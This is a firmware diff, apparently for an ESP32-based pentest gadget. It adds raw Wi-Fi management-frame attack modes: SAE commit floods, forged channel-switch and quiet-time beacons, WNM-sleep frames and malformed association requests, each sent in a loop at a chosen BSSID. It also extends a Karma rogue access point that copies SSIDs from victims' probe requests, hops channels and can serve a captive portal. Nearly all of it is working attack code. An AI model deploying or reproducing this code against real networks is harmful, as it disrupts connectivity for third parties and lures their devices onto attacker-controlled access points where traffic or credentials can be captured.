@@ -504,6 +504,208 @@ void probe_flood_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
     resp->payload_len = 0;
 }
 
+/* ---- Raw management-frame attack modes ---- */
+
+#define WIFI_RAW_ATK_SAE_COMMIT 0
+#define WIFI_RAW_ATK_CHAN_SWITCH 1
+#define WIFI_RAW_ATK_QUIET_TIME 2
+#define WIFI_RAW_ATK_SLEEP 3
+#define WIFI_RAW_ATK_BAD_MSG 4
+
+static TaskHandle_t raw_attack_task_handle = NULL;
+static volatile bool raw_attack_running = false;
+static uint8_t raw_attack_mode = WIFI_RAW_ATK_BAD_MSG;
+static uint8_t raw_attack_channel = BEACON_CHANNEL;
+static uint8_t raw_attack_bssid[6];
+static char raw_attack_ssid[MAX_SSID_LEN + 1];
+
+static void raw_attack_random_mac(uint8_t mac[6])
+{
+    esp_fill_random(mac, 6);
+    mac[0] |= 0x02;
+    mac[0] &= 0xFE;
+}
+
+static void raw_attack_mgmt_header(uint8_t *frame, uint8_t fc0,
+    const uint8_t dest[6], const uint8_t src[6], const uint8_t bssid[6],
+    uint16_t seq)
+{
+    frame[0] = fc0;
+    frame[1] = 0x00;
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    memcpy(&frame[4], dest, 6);
+    memcpy(&frame[10], src, 6);
+    memcpy(&frame[16], bssid, 6);
+    frame[22] = (seq & 0x0F) << 4;
+    frame[23] = (seq >> 4) & 0xFF;
+}
+
+static size_t raw_attack_build_sae(uint8_t *frame, size_t frame_len, uint16_t seq)
+{
+    uint8_t src[6];
+    raw_attack_random_mac(src);
+    raw_attack_mgmt_header(frame, 0xB0, raw_attack_bssid, src, raw_attack_bssid, seq);
+
+    if (frame_len < 126) return 0;
+    frame[24] = 0x03; frame[25] = 0x00; /* SAE auth algorithm */
+    frame[26] = 0x01; frame[27] = 0x00; /* commit */
+    frame[28] = 0x00; frame[29] = 0x00; /* status */
+    frame[30] = 0x13; frame[31] = 0x00; /* group 19 */
+    esp_fill_random(&frame[32], 94);
+    return 126;
+}
+
+static size_t raw_attack_build_beacon(uint8_t *frame, uint16_t seq, bool quiet)
+{
+    size_t pos;
+    static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+    raw_attack_mgmt_header(frame, 0x80, bcast, raw_attack_bssid, raw_attack_bssid, seq);
+    memset(&frame[24], 0, 8);
+    frame[32] = 0x64; frame[33] = 0x00;
+    frame[34] = 0x01; frame[35] = 0x04;
+    pos = 36;
+
+    uint8_t ssid_len = (uint8_t)strnlen(raw_attack_ssid, MAX_SSID_LEN);
+    frame[pos++] = 0x00; frame[pos++] = ssid_len;
+    if (ssid_len > 0) {
+        memcpy(&frame[pos], raw_attack_ssid, ssid_len);
+        pos += ssid_len;
+    }
+    frame[pos++] = 0x01; frame[pos++] = 0x04;
+    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
+    frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = raw_attack_channel;
+
+    if (quiet) {
+        frame[pos++] = 0x28; frame[pos++] = 0x06; /* Quiet element */
+        frame[pos++] = 0x01; frame[pos++] = 0x01;
+        frame[pos++] = 0xFF; frame[pos++] = 0x7F;
+        frame[pos++] = 0x00; frame[pos++] = 0x00;
+    } else {
+        uint8_t new_channel = raw_attack_channel >= 13 ? 1 : raw_attack_channel + 1;
+        frame[pos++] = 0x25; frame[pos++] = 0x03; /* Channel Switch Announcement */
+        frame[pos++] = 0x01; frame[pos++] = new_channel; frame[pos++] = 0x01;
+    }
+
+    return pos;
+}
+
+static size_t raw_attack_build_sleep(uint8_t *frame, uint16_t seq)
+{
+    uint8_t src[6];
+    raw_attack_random_mac(src);
+    raw_attack_mgmt_header(frame, 0xD0, raw_attack_bssid, src, raw_attack_bssid, seq);
+    frame[24] = 10; /* WNM */
+    frame[25] = 14; /* WNM-Sleep Mode */
+    frame[26] = (uint8_t)seq;
+    frame[27] = 1;  /* enter sleep */
+    frame[28] = 0xFF;
+    frame[29] = 0xFF;
+    return 30;
+}
+
+static size_t raw_attack_build_bad_msg(uint8_t *frame, uint16_t seq)
+{
+    uint8_t src[6];
+    raw_attack_random_mac(src);
+    raw_attack_mgmt_header(frame, 0x00, raw_attack_bssid, src, raw_attack_bssid, seq);
+    frame[24] = 0x31; frame[25] = 0x04; /* capability */
+    frame[26] = 0x0A; frame[27] = 0x00; /* listen interval */
+    uint8_t ssid_len = (uint8_t)strnlen(raw_attack_ssid, MAX_SSID_LEN);
+    frame[28] = 0x00; frame[29] = ssid_len ? ssid_len : 0x20;
+    size_t pos = 30;
+    if (ssid_len > 0) {
+        memcpy(&frame[pos], raw_attack_ssid, ssid_len);
+        pos += ssid_len;
+    }
+    esp_fill_random(&frame[pos], 32);
+    return pos + 32;
+}
+
+static size_t raw_attack_build_frame(uint8_t *frame, size_t frame_len, uint16_t seq)
+{
+    memset(frame, 0, frame_len);
+    switch (raw_attack_mode) {
+    case WIFI_RAW_ATK_SAE_COMMIT:
+        return raw_attack_build_sae(frame, frame_len, seq);
+    case WIFI_RAW_ATK_CHAN_SWITCH:
+        return raw_attack_build_beacon(frame, seq, false);
+    case WIFI_RAW_ATK_QUIET_TIME:
+        return raw_attack_build_beacon(frame, seq, true);
+    case WIFI_RAW_ATK_SLEEP:
+        return raw_attack_build_sleep(frame, seq);
+    default:
+        return raw_attack_build_bad_msg(frame, seq);
+    }
+}
+
+static void raw_attack_task(void *arg)
+{
+    (void)arg;
+    uint8_t frame[192];
+    uint16_t seq = 0;
+
+    esp_wifi_set_channel(raw_attack_channel, WIFI_SECOND_CHAN_NONE);
+    ESP_LOGI(TAG, "Raw WiFi attack started mode=%u ch=%u", raw_attack_mode, raw_attack_channel);
+
+    while (raw_attack_running) {
+        size_t len = raw_attack_build_frame(frame, sizeof(frame), ++seq);
+        if (len > 0) {
+            esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+        }
+        vTaskDelay(pdMS_TO_TICKS(8));
+    }
+
+    ESP_LOGI(TAG, "Raw WiFi attack stopped");
+    vTaskDelete(NULL);
+}
+
+void wifi_raw_attack_start(const m1_cmd_t *cmd, m1_resp_t *resp)
+{
+    if (raw_attack_running || deauth_running || beacon_running || probe_running) {
+        resp->status = RESP_BUSY;
+        return;
+    }
+    if (cmd->payload_len < 8) {
+        resp->status = RESP_ERR;
+        return;
+    }
+
+    raw_attack_mode = cmd->payload[0];
+    if (raw_attack_mode > WIFI_RAW_ATK_BAD_MSG) raw_attack_mode = WIFI_RAW_ATK_BAD_MSG;
+    raw_attack_channel = cmd->payload[1];
+    if (raw_attack_channel < 1 || raw_attack_channel > 13) raw_attack_channel = BEACON_CHANNEL;
+    memcpy(raw_attack_bssid, &cmd->payload[2], 6);
+    raw_attack_ssid[0] = '\0';
+    if (cmd->payload_len >= 9) {
+        uint8_t sl = cmd->payload[8];
+        if (sl > MAX_SSID_LEN) sl = MAX_SSID_LEN;
+        if (cmd->payload_len >= 9 + sl) {
+            memcpy(raw_attack_ssid, &cmd->payload[9], sl);
+            raw_attack_ssid[sl] = '\0';
+        }
+    }
+
+    esp_wifi_set_promiscuous(true);
+    raw_attack_running = true;
+    xTaskCreate(raw_attack_task, "wifi_raw_atk", 3072, NULL, 5, &raw_attack_task_handle);
+
+    resp->status = RESP_OK;
+    resp->payload_len = 0;
+}
+
+void wifi_raw_attack_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
+{
+    (void)cmd;
+    raw_attack_running = false;
+    raw_attack_task_handle = NULL;
+    esp_wifi_set_promiscuous(false);
+
+    resp->status = RESP_OK;
+    resp->payload_len = 0;
+}
+
 /* ---- Karma AP ---- */
 
 static TaskHandle_t karma_task_handle = NULL;
@@ -514,28 +716,69 @@ static char karma_pending_ssid[MAX_SSID_LEN + 1];
 static char karma_current_ssid[MAX_SSID_LEN + 1];
 static char karma_last_ssid[MAX_SSID_LEN + 1];
 static uint32_t karma_probe_count = 0;
+static uint32_t karma_total_probe_count = 0;
+static uint8_t karma_pending_channel = BEACON_CHANNEL;
+static uint8_t karma_current_channel = BEACON_CHANNEL;
+static uint8_t karma_hop_channel = 1;
+static TickType_t karma_last_switch_tick = 0;
 
-static void karma_set_ap_ssid(const char *ssid)
+static uint8_t karma_clean_ssid(const uint8_t *src, uint8_t len, char *dst, size_t dst_len)
+{
+    uint8_t out = 0;
+    if (!src || !dst || dst_len == 0) return 0;
+
+    for (uint8_t i = 0; i < len && out + 1 < dst_len; i++) {
+        uint8_t c = src[i];
+        if (c < 0x20 || c > 0x7E) {
+            continue;
+        }
+        dst[out++] = (char)c;
+    }
+    dst[out] = '\0';
+    return out;
+}
+
+static bool karma_set_ap_ssid(const char *ssid, uint8_t channel)
 {
     wifi_config_t ap_cfg;
+    esp_err_t err;
+
+    if (!ssid || !ssid[0]) {
+        return false;
+    }
+    if (channel < 1 || channel > 13) {
+        channel = BEACON_CHANNEL;
+    }
+
     memset(&ap_cfg, 0, sizeof(ap_cfg));
 
-    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid) - 1);
-    ap_cfg.ap.ssid_len = strlen(ssid);
-    ap_cfg.ap.channel = BEACON_CHANNEL;
+    size_t ssid_len = strnlen(ssid, MAX_SSID_LEN);
+    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
+    ap_cfg.ap.ssid_len = ssid_len;
+    ap_cfg.ap.channel = channel;
     ap_cfg.ap.max_connection = 4;
     ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
 
-    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "Karma AP set_config failed: %s", esp_err_to_name(err));
+        return false;
+    }
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if (karma_portal_mode) {
         portal_set_active_ssid(ssid);
     }
     strncpy(karma_current_ssid, ssid, sizeof(karma_current_ssid) - 1);
     karma_current_ssid[sizeof(karma_current_ssid) - 1] = '\0';
+    karma_current_channel = channel;
+    karma_last_switch_tick = xTaskGetTickCount();
+    return true;
 }
 
 static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
+    char ssid[MAX_SSID_LEN + 1];
+
     if (!karma_running || type != WIFI_PKT_MGMT) return;
 
     const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
@@ -544,6 +787,7 @@ static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 
     if (len < 26) return;
     if ((frame[0] & 0xFC) != 0x40) return; /* probe request */
+    karma_total_probe_count++;
 
     uint16_t pos = 24;
     while (pos + 2 <= len)
@@ -554,10 +798,18 @@ static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 
         if (tag == 0x00 && tag_len > 0 && tag_len <= MAX_SSID_LEN)
         {
-            memcpy(karma_pending_ssid, &frame[pos], tag_len);
-            karma_pending_ssid[tag_len] = '\0';
-            memcpy(karma_last_ssid, &frame[pos], tag_len);
-            karma_last_ssid[tag_len] = '\0';
+            uint8_t clean_len = karma_clean_ssid(&frame[pos], tag_len, ssid, sizeof(ssid));
+            if (clean_len == 0) {
+                break;
+            }
+            strncpy(karma_pending_ssid, ssid, sizeof(karma_pending_ssid) - 1);
+            karma_pending_ssid[sizeof(karma_pending_ssid) - 1] = '\0';
+            strncpy(karma_last_ssid, ssid, sizeof(karma_last_ssid) - 1);
+            karma_last_ssid[sizeof(karma_last_ssid) - 1] = '\0';
+            karma_pending_channel = pkt->rx_ctrl.channel;
+            if (karma_pending_channel < 1 || karma_pending_channel > 13) {
+                karma_pending_channel = karma_current_channel;
+            }
             karma_pending = true;
             karma_probe_count++;
             break;
@@ -570,28 +822,57 @@ static void karma_task(void *arg)
 {
     (void)arg;
     char ssid[MAX_SSID_LEN + 1];
+    TickType_t last_hop = xTaskGetTickCount();
 
-    karma_set_ap_ssid("M1-Karma");
     ESP_LOGI(TAG, "Karma started");
 
     while (karma_running)
     {
         if (karma_pending)
         {
+            TickType_t now = xTaskGetTickCount();
+            TickType_t min_switch = karma_portal_mode ? pdMS_TO_TICKS(3000) : pdMS_TO_TICKS(500);
+
             karma_pending = false;
             strncpy(ssid, karma_pending_ssid, sizeof(ssid) - 1);
             ssid[sizeof(ssid) - 1] = '\0';
-            if (ssid[0] && strcmp(ssid, karma_current_ssid) != 0)
+            if (ssid[0] && strcmp(ssid, karma_current_ssid) != 0 &&
+                now - karma_last_switch_tick >= min_switch)
             {
-                karma_set_ap_ssid(ssid);
-                ESP_LOGI(TAG, "Karma AP now '%s'", ssid);
+                if (karma_set_ap_ssid(ssid, karma_portal_mode ? karma_current_channel : karma_pending_channel)) {
+                    ESP_LOGI(TAG, "Karma AP now '%s' ch%u", ssid, karma_current_channel);
+                }
             }
+        }
+
+        if (!karma_portal_mode && xTaskGetTickCount() - last_hop >= pdMS_TO_TICKS(350)) {
+            karma_hop_channel++;
+            if (karma_hop_channel > 13) karma_hop_channel = 1;
+            esp_wifi_set_channel(karma_hop_channel, WIFI_SECOND_CHAN_NONE);
+            karma_current_channel = karma_hop_channel;
+            last_hop = xTaskGetTickCount();
         }
         vTaskDelay(pdMS_TO_TICKS(250));
     }
 
-    ESP_LOGI(TAG, "Karma stopped, probes=%lu", karma_probe_count);
+    ESP_LOGI(TAG, "Karma stopped, directed=%lu total=%lu",
+             karma_probe_count, karma_total_probe_count);
     vTaskDelete(NULL);
+}
+
+static void karma_reset_state(bool portal_mode)
+{
+    karma_probe_count = 0;
+    karma_total_probe_count = 0;
+    karma_pending = false;
+    karma_portal_mode = portal_mode;
+    karma_pending_channel = BEACON_CHANNEL;
+    karma_current_channel = BEACON_CHANNEL;
+    karma_hop_channel = BEACON_CHANNEL;
+    karma_last_switch_tick = 0;
+    memset(karma_pending_ssid, 0, sizeof(karma_pending_ssid));
+    memset(karma_current_ssid, 0, sizeof(karma_current_ssid));
+    memset(karma_last_ssid, 0, sizeof(karma_last_ssid));
 }
 
 void karma_start(const m1_cmd_t *cmd, m1_resp_t *resp)
@@ -602,15 +883,15 @@ void karma_start(const m1_cmd_t *cmd, m1_resp_t *resp)
         return;
     }
 
-    karma_probe_count = 0;
-    karma_pending = false;
-    karma_portal_mode = false;
-    memset(karma_pending_ssid, 0, sizeof(karma_pending_ssid));
-    memset(karma_current_ssid, 0, sizeof(karma_current_ssid));
-    memset(karma_last_ssid, 0, sizeof(karma_last_ssid));
+    karma_reset_state(false);
 
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-    esp_wifi_set_channel(BEACON_CHANNEL, WIFI_SECOND_CHAN_NONE);
+    if (!portal_prepare_ap("M1-Karma", BEACON_CHANNEL)) {
+        resp->status = RESP_ERR;
+        return;
+    }
+    strncpy(karma_current_ssid, "M1-Karma", sizeof(karma_current_ssid) - 1);
+    karma_current_ssid[sizeof(karma_current_ssid) - 1] = '\0';
+    karma_last_switch_tick = xTaskGetTickCount();
     esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
     esp_wifi_set_promiscuous(true);
 
@@ -629,18 +910,16 @@ void karma_portal_start(const m1_cmd_t *cmd, m1_resp_t *resp)
         return;
     }
 
-    karma_probe_count = 0;
-    karma_pending = false;
-    karma_portal_mode = true;
-    memset(karma_pending_ssid, 0, sizeof(karma_pending_ssid));
-    memset(karma_current_ssid, 0, sizeof(karma_current_ssid));
-    memset(karma_last_ssid, 0, sizeof(karma_last_ssid));
+    karma_reset_state(true);
 
     if (!portal_prepare_ap("M1-Karma", BEACON_CHANNEL) || !portal_services_start(true)) {
         karma_portal_mode = false;
         resp->status = RESP_ERR;
         return;
     }
+    strncpy(karma_current_ssid, "M1-Karma", sizeof(karma_current_ssid) - 1);
+    karma_current_ssid[sizeof(karma_current_ssid) - 1] = '\0';
+    karma_last_switch_tick = xTaskGetTickCount();
 
     esp_wifi_set_channel(BEACON_CHANNEL, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
@@ -668,7 +947,9 @@ void karma_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
 
     resp->payload[0] = (uint8_t)(karma_probe_count & 0xFF);
     resp->payload[1] = (uint8_t)((karma_probe_count >> 8) & 0xFF);
-    resp->payload_len = 2;
+    resp->payload[2] = (uint8_t)(karma_total_probe_count & 0xFF);
+    resp->payload[3] = (uint8_t)((karma_total_probe_count >> 8) & 0xFF);
+    resp->payload_len = 4;
     resp->status = RESP_OK;
 }
 
@@ -687,7 +968,10 @@ void karma_status(const m1_cmd_t *cmd, m1_resp_t *resp)
     if (slen > 0) {
         memcpy(&resp->payload[6], ssid, slen);
     }
-    resp->payload_len = 6 + slen;
+    resp->payload[6 + slen] = karma_current_channel;
+    resp->payload[7 + slen] = (uint8_t)(karma_total_probe_count & 0xFF);
+    resp->payload[8 + slen] = (uint8_t)((karma_total_probe_count >> 8) & 0xFF);
+    resp->payload_len = 9 + slen;
     resp->status = RESP_OK;
 }
 
